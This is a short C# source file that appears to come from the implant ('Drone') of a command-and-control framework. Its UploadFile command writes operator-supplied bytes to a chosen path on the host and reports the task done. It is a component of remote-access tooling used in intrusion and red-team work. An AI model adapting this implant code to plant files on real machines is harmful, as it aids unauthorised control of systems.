using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class UploadFile : DroneCommand
{
    public override byte Command => 0x1D;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        File.WriteAllBytes(task.Arguments[0], task.Artefact);
        await Drone.SendTaskComplete(task.Id);
    }
}